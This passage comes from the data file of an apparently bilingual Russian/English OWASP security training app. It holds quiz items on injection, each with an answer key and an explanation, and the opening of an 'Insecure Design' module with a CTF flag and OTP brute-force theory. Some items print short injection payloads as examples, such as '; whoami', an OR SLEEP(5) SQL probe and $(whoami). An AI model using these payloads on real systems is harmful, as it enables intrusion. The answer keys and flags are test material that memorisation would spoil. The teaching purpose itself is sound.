          M('требует SQL-базы', 'it only works in PDFs'),
          M('Не относится к данному классу уязвимостей', 'Does not belong to this vulnerability class'),
          M('вредоносный XML-документ определяет внешнюю сущность, которую парсер разрешает и обрабатывает, что может привести к чтению файлов/SSRF', 'a malicious XML document defines an external entity that the parser resolves and processes, potentially enabling file reads/SSRF'),
        ],
        ans: 3,
        e: M('XXE — инъекция через определение внешних сущностей в XML: парсер разрешает entity и может раскрыть файлы или вызвать SSRF. Поэтому XXE относят к классу Injection.', 'XXE is injection via external entity definitions in XML: the parser resolves the entity and may disclose files or trigger SSRF. That is why XXE is classed under Injection.'),
      },
      {
        q: M('LDAP Injection эксплуатирует:', 'LDAP Injection exploits:'),
        opts: [
          M('неправильную сборку LDAP-фильтра из непроверенного пользовательского ввода', 'improper construction of an LDAP filter from unvalidated user input'),
          M('переполнение буфера', 'a buffer overflow'),
          M('отсутствие MFA', 'lack of MFA'),
          M('слабость TLS', 'a weakness in TLS'),
        ],
        ans: 0,
        e: M('LDAP Injection эксплуатирует сборку LDAP-фильтра из непроверенного ввода, меняя условие поиска/аутентификации. Нужны экранирование спецсимволов LDAP и параметризация фильтров.', 'LDAP injection abuses building an LDAP filter from unvalidated input, altering search or authentication logic. Escape LDAP special characters and parameterize filters.'),
      },
      {
        q: M('Почему ORM не является 100% защитой от инъекций?', 'Why isn\'t an ORM 100% protection against injection?'),
        opts: [
          M('ORM никогда не подвержены инъекциям', 'ORMs are never vulnerable to injection'),
          M('При неаккуратном использовании (например, raw-запросы внутри ORM, построение фильтров через конкатенацию строк) ORM всё равно может быть уязвим', 'With careless use (e.g., raw queries inside an ORM, building filters via string concatenation), an ORM can still be vulnerable'),
          M('ORM полностью заменяет базу данных', 'An ORM completely replaces the database'),
          M('ORM работает только с NoSQL', 'An ORM only works with NoSQL'),
        ],
        ans: 1,
        e: M('ORM не гарантирует защиту, если используются raw-запросы, конкатенация в фильтрах или native SQL. При неверном использовании control plane снова смешивается с данными.', 'An ORM is not complete protection if you use raw queries, concatenated filters, or native SQL. Misuse again mixes the control plane with data.'),
      },
      {
        q: M('UNION-based SQL Injection используется атакующим для:', 'UNION-based SQL Injection is used by an attacker to:'),
        opts: [
          M('изменения структуры таблицы', 'alter a table\'s structure'),
          M('шифрования базы данных', 'encrypt the database'),
          M('объединения результата вредоносного SELECT-запроса с результатом легитимного запроса для извлечения данных из других таблиц', 'merge the result of a malicious SELECT query with a legitimate query\'s result to extract data from other tables'),
          M('удаления таблицы', 'delete a table'),
        ],
        ans: 2,
        e: M('UNION-based SQLi объединяет вредоносный SELECT с результатом легитимного запроса, чтобы вытащить данные из других таблиц. Число и типы колонок должны совпадать с исходным SELECT.', 'UNION-based SQLi merges a malicious SELECT with a legitimate query’s result to extract data from other tables. Column count and types must match the original SELECT.'),
      },
      {
        q: M('OGNL/SpEL injection (например, в Struts2/Spring) относится к подтипу:', 'OGNL/SpEL injection (e.g., in Struts2/Spring) belongs to which subtype?'),
        opts: [
          M('SQL Injection', 'SQL Injection'),
          M('CSRF', 'CSRF'),
          M('XSS', 'XSS'),
          M('Expression Language / Command Injection, часто приводящему к RCE', 'Expression Language / Command Injection, often leading to RCE'),
        ],
        ans: 3,
        e: M('OGNL/SpEL injection — это инъекция expression language, часто ведущая к RCE в экосистемах Java (Struts2, Spring). Это подтип Expression Language / Command Injection, а не классический SQL.', 'OGNL/SpEL injection is expression-language injection that often yields RCE in Java stacks (Struts2, Spring). It is EL/command injection, not classic SQL injection.'),
      },
      {
        q: M('Диапазон impact для категории Injection в OWASP описывается как:', 'The impact range for the Injection category in OWASP is described as:'),
        opts: [
          M('от high-frequency/low-impact (например, часть XSS) до low-frequency/high-impact (например, SQLi)', 'ranging from high-frequency/low-impact (some XSS) to low-frequency/high-impact (SQLi)'),
          M('всегда критичный', 'always critical'),
          M('от низкого до критичного одинаково для всех подтипов', 'uniformly low-to-critical across all subtypes'),
          M('всегда низкий', 'always low'),
        ],
        ans: 0,
        e: M('По OWASP влияние Injection варьируется: от частых, но часто ограниченных XSS до более редких, но высоковлиятельных SQLi/RCE. Категория охватывает оба полюса риска.', 'Per OWASP, Injection impact ranges from high-frequency, often lower-impact XSS to lower-frequency, high-impact SQLi/RCE. The category spans both ends of that risk spectrum.'),
      },
      {
        q: M('Позитивная валидация ввода (allow-list) предпочтительнее негативной (deny-list, блэклист специальных символов), потому что:', 'Positive input validation (allow-list) is preferable to negative validation (deny-list/blacklisting special characters) because:'),
        opts: [
          M('deny-list быстрее работает', 'deny-lists run faster'),
          M('allow-list определяет точно разрешённый формат, тогда как deny-list легко обойти новыми/непредвиденными техниками обхода', 'an allow-list defines the exact permitted format, while a deny-list can easily be bypassed by new/unforeseen bypass techniques'),
          M('они эквивалентны по эффективности', 'they\'re equally effective'),
          M('allow-list проще в реализации технически', 'allow-lists are technically simpler to implement'),
        ],
        ans: 1,
        e: M('Allow-list задаёт точный допустимый формат ввода, тогда как deny-list легко обходится новыми вариантами payload. Для инъекций positive validation предпочтительнее negative.', 'An allow-list defines the exact permitted input format, while a deny-list is easily bypassed with novel payloads. For injection, positive validation beats negative filtering.'),
      },
      {
        q: M('Что из перечисленного — правильный тест на blind time-based SQL Injection?', 'What\'s the correct test for blind time-based SQL Injection?'),
        opts: [
          M('Отправить крайне длинную строку', 'Send an extremely long string'),
          M('Проверить заголовок Server', 'Check the Server header'),
          M('Отправить payload вида \' OR SLEEP(5)-- - и замерить задержку ответа', 'Send a payload like \' OR SLEEP(5)-- - and measure the response delay'),
          M('Проверить cookie на HttpOnly', 'Check the cookie for HttpOnly'),
        ],
        ans: 2,
        e: M('Корректный тест time-based blind SQLi — payload с SLEEP/задержкой и измерение времени ответа. Заметная пауза при истинном условии подтверждает выполнение.', 'A correct time-based blind SQLi test sends a SLEEP/delay payload and measures response time. A clear pause under a true condition confirms injection.'),
      },
      {
        q: M('Ограничение прав учётной записи БД приложения (read-only там, где не нужна запись) относится к принципу:', 'Restricting the application\'s DB account privileges (read-only where write isn\'t needed) relates to the principle of:'),
        opts: [
          M('требуется только для NoSQL', 'required only for NoSQL'),
          M('не связано с injection', 'unrelated to injection'),
          M('заменяет необходимость параметризации', 'it replaces the need for parameterization'),
          M('defense in depth / least privilege — снижает impact успешной инъекции даже при её наличии', 'defense in depth / least privilege — reduces the impact of a successful injection even if one exists'),
        ],
        ans: 3,
        e: M('Урезание привилегий учётки приложения в БД — least privilege / defense in depth: даже при успешной инъекции ущерб ограничен. Это не устраняет root cause, но снижает impact.', 'Restricting the app’s DB privileges is least privilege / defense in depth: even a successful injection has limited impact. It does not remove the root cause but reduces damage.'),
      },
      {
        q: M('Почему статический анализ кода (SAST) полезен для поиска инъекций?', 'Why is static analysis (SAST) useful for finding injections?'),
        opts: [
          M('SAST может обнаружить паттерны конкатенации пользовательского ввода в запросах/командах на этапе разработки, до продакшена', 'SAST can detect patterns of user input concatenated into queries/commands during development, before production'),
          M('SAST работает только с скомпилированным кодом', 'SAST only works on compiled code'),
          M('SAST заменяет пентест полностью', 'SAST fully replaces pentesting'),
          M('SAST может автоматически исправлять код', 'SAST can automatically fix code'),
        ],
        ans: 0,
        e: M('SAST находит паттерны слияния untrusted input с sink’ами (запросы, команды) ещё на этапе разработки. Это помогает закрыть инъекции до продакшена, когда DAST ещё недоступен.', 'SAST detects patterns where untrusted input reaches sinks (queries, commands) during development. That helps fix injections before production, when DAST may not yet apply.'),
      },
      {
        q: M('Атрибут HttpOnly для cookie снижает риск:', 'The HttpOnly cookie attribute reduces the risk of:'),
        opts: [
          M('SSTI', 'SSTI'),
          M('кражи cookie через XSS (JS не может прочитать HttpOnly cookie)', 'cookie theft via XSS (JS can\'t read an HttpOnly cookie)'),
          M('CSRF', 'CSRF'),
          M('SQL Injection', 'SQL Injection'),
        ],
        ans: 1,
        e: M('Флаг HttpOnly запрещает JavaScript читать cookie, снижая кражу сессии через XSS. Он не предотвращает сам XSS и не защищает от CSRF.', 'HttpOnly stops JavaScript from reading the cookie, reducing session theft via XSS. It does not prevent XSS itself and does not stop CSRF.'),
      },
      {
        q: M('Что из перечисленного — пример mutation-based XSS (mXSS)?', 'Which of the following is an example of mutation-based XSS (mXSS)?'),
        opts: [
          M('LDAP-фильтр', 'An LDAP filter'),
          M('Payload напрямую отражается без изменений', 'The payload is reflected directly, unchanged'),
          M('Браузер при парсинге/санитизации HTML трансформирует «безопасный» на вид input в исполняемый код из-за особенностей парсера', 'The browser, while parsing/sanitizing HTML, transforms seemingly "safe" input into executable code due to parser quirks'),
          M('SQL-запрос с UNION', 'An SQL UNION query'),
        ],
        ans: 2,
        e: M('mXSS — когда браузер при парсинге/«очистке» HTML переписывает, казалось бы, безопасную разметку в исполняемый код. Классические санитайзеры без учёта мутаций парсера могут пропустить это.', 'mXSS occurs when the browser’s HTML parse/sanitize path rewrites seemingly safe markup into executable code. Sanitizers that ignore parser mutations can miss this.'),
      },
      {
        q: M('Почему инъекция через файл-загрузку (например, filename с \'; DROP TABLE...) тоже относится к A05?', 'Why does injection via a file upload (e.g., a filename like \'; DROP TABLE...) also fall under A05?'),
        opts: [
          M('Загрузка файлов не связана с injection', 'File uploads are unrelated to injection'),
          M('Это относится только к Broken Access Control', 'It relates only to Broken Access Control'),
          M('Загрузка файлов всегда безопасна', 'File uploads are always safe'),
          M('Метаданные файла (имя, EXIF) — тоже пользовательский ввод, который может использоваться в запросах/командах без должной санитизации', 'File metadata (name, EXIF) is also user input, which can be used in queries/commands without proper sanitization'),
        ],
        ans: 3,
        e: M('Имя файла, EXIF и другие метаданные — тоже пользовательский ввод; если их конкатенируют в SQL/команду, возникает инъекция. Загрузка файлов расширяет поверхность Injection.', 'Filenames, EXIF, and other metadata are still user input; concatenating them into SQL or commands enables injection. Uploads expand the Injection attack surface.'),
      },
      {
        q: M('Command Injection payload вида "; whoami" эксплуатирует:', 'The command-injection payload "; whoami" exploits:'),
        opts: [
          M('отсутствие экранирования спецсимволов шелла при передаче ввода в системный вызов', 'the lack of shell special-character escaping when passing input to a system call'),
          M('неправильную конфигурацию CORS', 'incorrect CORS configuration'),
          M('слабый TLS', 'a weak TLS setup'),
          M('отсутствие CSRF-токена', 'missing CSRF token'),
        ],
        ans: 0,
        e: M('Payload «; whoami» использует разделители/метасимволы shell, когда ввод уходит в system call без безопасного API аргументов. Отсутствие экранирования позволяет добавить вторую команду.', 'The “; whoami” payload abuses shell separators/metacharacters when input is passed to a system call without a safe argument API. Missing escaping lets an extra command run.'),
      },
      {
        q: M('Инструмент sqlmap используется для:', 'The sqlmap tool is used for:'),
        opts: [
          M('статического анализа кода', 'static code analysis'),
          M('автоматизированного обнаружения и эксплуатации SQL-инъекций', 'automated detection and exploitation of SQL injection'),
          M('сканирования Wi-Fi сетей', 'Wi-Fi network scanning'),
          M('анализа TLS-сертификатов', 'TLS certificate analysis'),
        ],
        ans: 1,
        e: M('sqlmap автоматизирует обнаружение и эксплуатацию SQL Injection: fingerprint, payload’ы, извлечение данных. Это специализированный инструмент под SQLi, а не общий XSS-сканер.', 'sqlmap automates SQL injection detection and exploitation: fingerprinting, payloads, and data extraction. It is SQLi-focused, not a general XSS scanner.'),
      },
      {
        q: M('Что из перечисленного правильно описывает stacked queries (batch queries) в SQLi?', 'Which of the following correctly describes stacked queries (batch queries) in SQLi?'),
        opts: [
          M('Тип XSS', 'A type of XSS'),
          M('Единственный тип SQL-инъекции', 'The only type of SQL injection'),
          M('Выполнение нескольких SQL-запросов подряд через один инъекционный ввод (разделённых ;), не всегда поддерживается всеми СУБД/драйверами', 'Executing several SQL queries in a row through a single injection point (separated by ;), not always supported by all DBMS/drivers'),
          M('Тип CSRF', 'A type of CSRF'),
        ],
        ans: 2,
        e: M('Stacked/batch queries — выполнение нескольких SQL-операторов через один injection point (часто через «;»), но поддержка зависит от драйвера/СУБД. Не все стеки допускают такой режим.', 'Stacked/batch queries execute multiple SQL statements via one injection point (often with “;”), but support depends on the driver/DBMS. Not every stack allows that mode.'),
      },
      {
        q: M('Почему WAF (Web Application Firewall) не должен рассматриваться как единственная защита от инъекций?', 'Why shouldn\'t a WAF (Web Application Firewall) be treated as the only defense against injection?'),
        opts: [
          M('WAF не влияет на инъекции вообще', 'A WAF has no effect on injections at all'),
          M('WAF полностью устраняет риск сам по себе', 'A WAF fully eliminates the risk on its own'),
          M('WAF заменяет необходимость патчинга', 'A WAF removes the need for patching'),
          M('WAF — дополнительный слой (defense-in-depth), но может быть обойдён через обфускацию payload\'ов; корневая защита — параметризация/валидация в коде', 'A WAF is an additional layer (defense-in-depth) but can be bypassed via payload obfuscation; the root defense is parameterization/validation in code'),
        ],
        ans: 3,
        e: M('WAF — дополнительный слой и может обходиться обфускацией payload; корневая защита — параметризация, безопасные API и экранирование. WAF alone не заменяет исправление кода.', 'A WAF is an extra layer and can be bypassed with payload obfuscation; root defense is parameterization, safe APIs, and encoding. A WAF alone does not replace fixing the code.'),
      },
      {
        q: M('Атака Blind XXE может использоваться для эксфильтрации данных через:', 'A Blind XXE attack can be used to exfiltrate data via:'),
        opts: [
          M('DNS/HTTP out-of-band канал (внешний DTD, отправляющий данные на сервер атакующего)', 'a DNS/HTTP out-of-band channel (an external DTD sending data to the attacker\'s server)'),
          M('только через прямой вывод в отклик', 'only via direct output in the response'),
          M('только через SMTP', 'only via SMTP'),
          M('невозможна без прямого вывода', 'it\'s impossible without direct output'),
        ],
        ans: 0,
        e: M('Blind XXE часто эксфильтрирует данные out-of-band через DNS/HTTP к внешнему DTD/серверу атакующего. Прямого содержимого entity в HTTP-ответе может не быть.', 'Blind XXE often exfiltrates data out-of-band via DNS/HTTP to an attacker-controlled external DTD/server. The entity content may never appear in the HTTP response.'),
      },
      {
        q: M('Что из перечисленного — пример инъекции в контекст JavaScript-строки (отличается от инъекции в HTML-тег по способу экранирования)?', 'Which of the following is an example of an injection into a JavaScript-string context (different escaping requirement than an HTML-tag injection)?'),
        opts: [
          M('<script>alert(1)<\/script> в теле страницы', '<script>alert(1)<\/script> in the page body'),
          M('ввод, вставляемый внутрь var x = "USER_INPUT"; в inline-скрипте, требующий JS-escape, а не HTML-escape', 'input inserted inside var x = "USER_INPUT"; in an inline script, requiring JS-escaping rather than HTML-escaping'),
          M('SQL UNION SELECT', 'an SQL UNION SELECT'),
          M('LDAP filter', 'an LDAP filter'),
        ],
        ans: 1,
        e: M('Вставка в JS-строку (var x = "USER_INPUT";) требует JS-экранирования кавычек/спецсимволов, а не только HTML entity encoding. Неверный контекст экранирования оставляет XSS.', 'Insertion into a JS string (var x = "USER_INPUT";) needs JavaScript escaping of quotes/specials, not only HTML entity encoding. Wrong encoding context leaves XSS open.'),
      },
      {
        q: M('Почему шаблонизаторы с «sandbox-режимом» (например, ограниченный Jinja2) снижают риск SSTI?', 'Why do sandboxed template engines (e.g., restricted Jinja2) reduce SSTI risk?'),
        opts: [
          M('Требуется отключить шаблонизатор полностью', 'The template engine must be disabled entirely'),
          M('Они полностью убирают возможность инъекции синтаксиса шаблона', 'They completely remove the possibility of template-syntax injection'),
          M('Они ограничивают доступные в шаблоне объекты/методы, снижая вероятность достижения RCE даже при инъекции в шаблон', 'They limit the objects/methods available inside the template, reducing the likelihood of reaching RCE even if injection into the template occurs'),
          M('Sandbox не влияет на SSTI', 'A sandbox has no effect on SSTI'),
        ],
        ans: 2,
        e: M('Sandbox/restricted mode шаблонизатора ограничивает доступные объекты и методы, затрудняя выход к RCE через SSTI. Это defense-in-depth наряду с запретом untrusted templates.', 'A sandboxed/restricted template mode limits available objects and methods, making RCE via SSTI harder. It is defense-in-depth alongside forbidding untrusted templates.'),
      },
      {
        q: M('Согласно данным OWASP 2025, категория Injection упала с #3 (2021) на #5 (2025) в рейтинге. Наиболее вероятная причина:', 'Per OWASP 2025 data, Injection fell from #3 (2021) to #5 (2025) in ranking. The most likely reason:'),
        opts: [
          M('инъекции больше не существуют', 'injections no longer exist'),
          M('OWASP решил исключить SQLi из списка', 'OWASP decided to exclude SQLi from the list'),
          M('Инъекции теперь относятся к A01', 'Injections now fall under A01'),
          M('улучшение индустриальных практик (широкое распространение ORM, параметризованных запросов, автоматических фреймворков экранирования) снизило частоту, хотя категория остаётся значимой', 'improved industry practices (widespread use of ORMs, parameterized queries, automatic framework escaping) reduced frequency, though the category remains significant'),
        ],
        ans: 3,
        e: M('Injection опустилась с #3 (2021) до #5 (2025) во многом благодаря ORM, prepared statements и автоэкранированию фреймворков. Риск остаётся, но зрелость практик выросла.', 'Injection fell from #3 (2021) to #5 (2025) largely due to ORMs, prepared statements, and framework auto-escaping. Risk remains, but industry practices improved.'),
      },
      {
        q: M('Что из перечисленного — правильный подход к экранированию вывода в атрибуте HTML-тега (например, <div title="USER_INPUT">)?', 'Which of the following is the correct approach to escaping output within an HTML tag attribute (e.g., <div title="USER_INPUT">)?'),
        opts: [
          M('HTML entity encoding для спецсимволов атрибута (", \', <, >, &)', 'HTML entity encoding for the attribute\'s special characters (", \', <, >, &)'),
          M('Использование Base64', 'Using Base64'),
          M('Экранирование не требуется, если используется HTTPS', 'No escaping is needed if HTTPS is used'),
          M('Достаточно только серверной валидации по regex', 'Server-side regex validation alone is sufficient'),
        ],
        ans: 0,
        e: M('В HTML-атрибуте нужно HTML-entity encoding спецсимволов атрибута (« \' < > &), чтобы закрыть выход из значения. Иначе XSS возможен через разрыв атрибута.', 'Inside an HTML attribute, HTML-entity-encode attribute specials (" \' < > &) to prevent breaking out of the value. Otherwise XSS can escape the attribute context.'),
      },
      {
        q: M('Fuzzing входных точек спецсимволами (\' " ; -- <script> {{7*7}} $(whoami)) на пентесте применяется для:', 'Fuzzing input points with special characters (\' " ; -- <script> {{7*7}} $(whoami)) during a pentest is used to:'),
        opts: [
          M('проверки TLS', 'check TLS'),
          M('выявления потенциальных точек инъекции по аномальному поведению отклика (ошибки, задержки, отражение payload)', 'discover potential injection points via anomalous response behavior (errors, delays, payload reflection)'),
          M('проверки производительности', 'test performance'),
          M('проверки cookie-флагов', 'check cookie flags'),
        ],
        ans: 1,
        e: M('Фаззинг спецсимволами (\' " ; -- <script> {{7*7}} и т.д.) помогает найти injection points по аномалиям: ошибкам, задержкам, отражению. Это разведка, а не готовая эксплуатация.', 'Fuzzing with specials (\' " ; -- <script> {{7*7}}, etc.) finds injection points via anomalies: errors, delays, reflection. It is discovery, not full exploitation.'),
      },
      {
        q: M('Что из перечисленного справедливо про полиглот-payload\'ы (polyglot payloads) в контексте тестирования на инъекции?', 'Which of the following is true about polyglot payloads in injection testing?'),
        opts: [
          M('Не имеют практического применения', 'They have no practical application'),
          M('Работают только для SQLi', 'They only work for SQLi'),
          M('Специально сконструированы так, чтобы одновременно триггерить несколько типов инъекций (XSS+SQLi и т.д.) для эффективного первичного фаззинга', 'They\'re specifically crafted to simultaneously trigger multiple injection types (XSS+SQLi, etc.) for efficient initial fuzzing'),
          M('Используются только для DoS', 'They\'re used only for DoS'),
        ],
        ans: 2,
        e: M('Polyglot-payload’ы специально составлены, чтобы одновременно триггерить несколько типов инъекций (XSS+SQLi и др.) для ускорения тестирования. Это не «безопасный» ввод, а диагностический инструмент.', 'Polyglot payloads are crafted to trigger multiple injection types at once (XSS+SQLi, etc.) to speed testing. They are diagnostic tools, not “safe” input.'),
      },
      {
        q: M('Инъекция в HTTP-заголовок User-Agent, который затем логируется и отображается в админ-панели без экранирования, — пример:', 'An injection into the User-Agent HTTP header, which is then logged and rendered in an admin panel without escaping, is an example of:'),
        opts: [
          M('SSRF', 'SSRF'),
          M('LDAP Injection', 'LDAP Injection'),
          M('CSRF', 'CSRF'),
          M('Stored XSS через нестандартную точку ввода', 'Stored XSS via a nonstandard input point'),
        ],
        ans: 3,
        e: M('User-Agent, попавший в логи и затем отрендеренный в HTML без экранирования, даёт Stored XSS через нестандартную точку ввода. Любой отражённый заголовок — потенциальный sink.', 'A User-Agent logged and later rendered in HTML without encoding yields Stored XSS via a nonstandard input point. Any reflected header can be a sink.'),
      },
      {
        q: M('Почему атрибут X-XSS-Protection считается устаревшим и его отсутствие сейчас не является проблемой согласно современным рекомендациям?', 'Why is the absence of the X-XSS-Protection header now considered a non-issue per current recommendations?'),
        opts: [
          M('Современные браузеры удалили встроенный XSS-auditor из-за собственных уязвимостей; актуальная защита — CSP', 'Modern browsers removed the built-in XSS-auditor due to its own vulnerabilities; the current mitigation is CSP'),
          M('Он никогда не работал', 'It never worked'),
          M('Он относится к SQLi, а не XSS', 'It relates to SQLi, not XSS'),
          M('Он всё ещё обязателен и является главной защитой', 'It\'s still mandatory and the primary defense'),
        ],
        ans: 0,
        e: M('X-XSS-Protection устарел: современные браузеры убрали XSS-auditor из-за его собственных проблем. Актуальные меры — CSP, контекстное экранирование и безопасные фреймворки.', 'X-XSS-Protection is obsolete: modern browsers removed the XSS auditor due to its own flaws. Current mitigations are CSP, context-aware encoding, and safe frameworks.'),
      },
      {
        q: M('Инъекция через десериализацию (например, Java gadget chains) пересекается с какой ещё категорией OWASP?', 'Deserialization-based injection (e.g., Java gadget chains) overlaps with which other OWASP category?'),
        opts: [
          M('A07 Authentication Failures', 'A07 Authentication Failures'),
          M('A08 Software/Data Integrity Failures (небезопасная десериализация)', 'A08 Software/Data Integrity Failures (insecure deserialization)'),
          M('A09 Logging Failures', 'A09 Logging Failures'),
          M('A02 Misconfiguration', 'A02 Misconfiguration'),
        ],
        ans: 1,
        e: M('Небезопасная десериализация (gadget chains) пересекается с A08 Software/Data Integrity Failures, хотя payload тоже «инъецирует» поведение. В Top 10:2025 это в первую очередь integrity/deserial class.', 'Insecure deserialization (gadget chains) overlaps A08 Software/Data Integrity Failures, even though the payload injects behavior. In Top 10:2025 it primarily sits in the integrity/deserial class.'),
      },
      {
        q: M('Что из перечисленного — верное описание «второго порядка» (stored) command injection?', 'Which of the following correctly describes "second-order" (stored) command injection?'),
        opts: [
          M('Не существует такого типа', 'No such type exists'),
          M('Работает только с SQL', 'It only works with SQL'),
          M('Вредоносный ввод сохраняется (например, в конфигурации/БД) и позже используется в системном вызове другим компонентом/процессом', 'Malicious input is stored (e.g., in a config/DB) and later used in a system call by a different component/process'),
          M('Команда выполняется сразу при вводе', 'The command executes immediately upon input'),
        ],
        ans: 2,
        e: M('Second-order command injection: вредоносный ввод сохраняется (конфиг/БД), а позже другой компонент подставляет его в system call. Эксплуатация отложена и может быть в другом сервисе.', 'Second-order command injection stores malicious input (config/DB), then another component later uses it in a system call. Exploitation is delayed and may hit a different service.'),
      },
      {
        q: M('GraphQL-инъекции (например, через nested queries для DoS или injection в resolver) относятся к:', 'GraphQL injections (e.g., through nested queries for DoS or resolver injection) fall under:'),
        opts: [
          M('исключительно к SSRF', 'exclusively SSRF'),
          M('отдельной категории вне OWASP', 'a separate category outside OWASP'),
          M('исключительно к CSRF', 'exclusively CSRF'),
          M('подмножеству Injection (A05) с учётом специфики GraphQL как альтернативы REST', 'a subset of Injection (A05), given the specifics of GraphQL as a REST alternative'),
        ],
        ans: 3,
        e: M('Инъекции и abuse GraphQL (resolver injection, nested query DoS) относятся к подмножеству Injection (A05) с учётом специфики GraphQL. Это не отдельная категория Top 10.', 'GraphQL injections and related abuse (resolver injection, nested-query DoS) are a subset of Injection (A05) with GraphQL specifics. They are not a separate Top 10 category.'),
      },
      {
        q: M('Почему санитизация markdown/rich-text контента (например, в комментариях блога) — частый источник Stored XSS?', 'Why is sanitizing markdown/rich-text content (e.g., in blog comments) a frequent source of Stored XSS?'),
        opts: [
          M('Неправильная конфигурация markdown-парсера может пропускать HTML/JS-теги в итоговый рендер, обходя базовую защиту', 'Improper markdown parser configuration can allow HTML/JS tags through into the final render, bypassing basic protection'),
          M('Не относится к XSS', 'It\'s unrelated to XSS'),
          M('Markdown никогда не рендерится в HTML', 'Markdown never renders to HTML'),
          M('Markdown безопасен по умолчанию всегда', 'Markdown is always safe by default'),
        ],
        ans: 0,
        e: M('Некорректная настройка markdown/rich-text парсера может пропустить HTML/JS в итоговый рендер, обходя ожидание «только текст». Санитизация rich content — частый источник Stored XSS.', 'A misconfigured markdown/rich-text parser can allow HTML/JS into the final render, bypassing a “plain text only” assumption. Sanitizing rich content is a common Stored XSS source.'),
      },
      {
        q: M('Инъекция в regex (ReDoS — Regular Expression Denial of Service) относится к подклассу:', 'Regex injection (ReDoS — Regular Expression Denial of Service) belongs to a subclass of:'),
        opts: [
          M('CSRF', 'CSRF'),
          M('Injection-класса уязвимостей, приводящих к DoS через катастрофический backtracking в неоптимальном regex-паттерне', 'an Injection-class vulnerability leading to DoS through catastrophic backtracking in a poorly optimized regex pattern'),
          M('XSS', 'XSS'),
          M('SQL Injection', 'SQL Injection'),
        ],
        ans: 1,
        e: M('ReDoS — инъекция/злоупотребление регулярными выражениями через catastrophic backtracking, ведущее к DoS. Это injection-class проблема производительности/доступности, а не кража данных.', 'ReDoS is regex injection/abuse via catastrophic backtracking that causes DoS. It is an injection-class availability issue, not data theft.'),
      },
      {
        q: M('Что из перечисленного — правильная защита от Command Injection, если экранирование ввода технически сложно реализовать надёжно?', 'Which of the following is the correct defense against Command Injection when reliable input escaping is technically hard to guarantee?'),
        opts: [
          M('Просто увеличить логирование', 'Simply increasing logging'),
          M('Использовать более длинные пароли', 'Using longer passwords'),
          M('Использование allow-list разрешённых команд/аргументов и API языка программирования вместо вызова shell (например, subprocess с list аргументов вместо shell=True)', 'Using an allow-list of permitted commands/arguments and the language\'s API instead of invoking a shell (e.g., subprocess with a list of args instead of shell=True)'),
          M('Отключить HTTPS', 'Disabling HTTPS'),
        ],
        ans: 2,
        e: M('Против Command Injection предпочтительны allow-list команд/аргументов и API без shell (exec с массивом аргументов), а не фильтрация «опасных» символов. Так control plane не строится из строк пользователя.', 'Against command injection prefer an allow-list of commands/args and shell-less APIs (exec with argument arrays), not filtering “bad” characters. That keeps the control plane out of user strings.'),
      },
      {
        q: M('Почему тестирование инъекций через файлы cookie/заголовки важно, а не только через параметры формы/URL?', 'Why does testing injection via cookies/headers matter, not just via form parameters/URLs?'),
        opts: [
          M('Заголовки нельзя подделать', 'Headers can\'t be tampered with'),
          M('Cookie и заголовки никогда не обрабатываются сервером', 'Cookies and headers are never processed server-side'),
          M('Cookie автоматически экранируются браузером', 'Cookies are automatically escaped by the browser'),
          M('Любая точка, откуда сервер читает пользовательский ввод (включая cookie, заголовки, JSON body), потенциально уязвима, если используется в запросе/команде без валидации', 'Any point where the server reads user input (including cookies, headers, JSON body) is potentially vulnerable if used in a query/command without validation'),
        ],
        ans: 3,
        e: M('Cookies, заголовки и JSON body — такие же untrusted inputs, как поля формы. Если сервер использует их в запросах/выводе без защиты, инъекция возможна и там.', 'Cookies, headers, and JSON bodies are untrusted inputs just like form fields. If the server uses them in queries/output without protection, injection works there too.'),
      },
      {
        q: M('AST-based/семантический анализ кода превосходит простой regex-based поиск инъекций тем, что:', 'Why does AST-based/semantic code analysis outperform simple regex-based injection scanning?'),
        opts: [
          M('он понимает структуру кода (поток данных от source к sink), а не просто ищет текстовые паттерны, снижая число false positive/negative', 'It understands code structure (data flow from source to sink) rather than just searching for text patterns, reducing false positives/negatives'),
          M('он работает только на скомпилированном коде', 'It only works on compiled code'),
          M('он не может анализировать SQL', 'It can\'t analyze SQL'),
          M('он медленнее и потому хуже', 'It\'s slower, and thus worse'),
        ],
        ans: 0,
        e: M('AST/семантический анализ отслеживает поток данных от source к sink, а не только текстовые regex-паттерны. Это снижает ложные срабатывания и находит нетривиальные пути инъекции.', 'AST/semantic analysis tracks data flow from sources to sinks rather than only matching text with regex. That cuts false positives and finds non-obvious injection paths.'),
      },
      {
        q: M('Какая мера НАИБОЛЕЕ эффективна как единая root-cause защита против большинства подтипов Injection одновременно?', 'Which measure is MOST effective as a single root-cause defense against most Injection subtypes at once?'),
        opts: [
          M('Отключение JavaScript на клиенте', 'Disabling JavaScript on the client'),
          M('Строгое разделение data plane и control plane на уровне API языка (параметризация/безопасные API) + контекстное экранирование вывода + позитивная валидация ввода', 'Strict separation of the data plane and control plane at the language API level (parameterization/safe APIs) + context-aware output escaping + positive input validation'),
          M('Увеличение логирования запросов', 'Increasing request logging'),
          M('Использование WAF как единственной меры', 'Using a WAF as the only measure'),
        ],
        ans: 1,
        e: M('Самая эффективная корневая защита — строгое разделение data plane и control plane через параметризацию и безопасные API языка. Валидация и WAF дополняют, но не заменяют это разделение.', 'The most effective root defense is strict data/control-plane separation via parameterization and safe language APIs. Validation and WAFs help but do not replace that separation.'),
      },
    ],
  },
  {
    code: 'A04', name: 'Insecure Design', nameRu: 'Небезопасный дизайн',
    risk: 'HIGH', owasp2021: 'A04', owasp2025: 'A06',
    cwe: ['CWE-799', 'CWE-640', 'CWE-307'],
    flag: 'FLAG{otp_bruteforce_no_rate_limit}',
    blurb: M('Четырёхзначные OTP без ограничения попыток, контрольные вопросы и ошибки бизнес-логики.', '4-digit OTP without rate-limit, security questions, business logic flaws.'),
    theory: M(
`<p><strong>Insecure Design</strong> — уязвимость заложена в архитектуру. Патч «поверх» не спасает — нужен redesign.</p>
<div class="ebox">4-digit OTP: 0000–9999 = 10 000 вариантов
10 req/s  → ~17 мин
1000 req/s (нет rate limit) → 10 сек

Защита: 6+ цифр + lockout + progressive delay + MFA</div>
<p>Threat modeling: <strong>STRIDE</strong>. Примеры: «секретный вопрос», хранение PAN, нет anti-automation.</p>`,
`<p><strong>Insecure Design</strong> — flaws built into architecture. Surface patches fail; you need redesign.</p>
<div class="ebox">4-digit OTP: 0000–9999 = 10,000 combos
10 req/s  → ~17 min
1000 req/s (no rate limit) → 10 sec

Defense: 6+ digits + lockout + progressive delay + MFA</div>
<p>Threat modeling: <strong>STRIDE</strong>. Examples: security questions, storing PAN, no anti-automation.</p>`
    ),
    vulnCode: `// 4-digit OTP, no rate limit
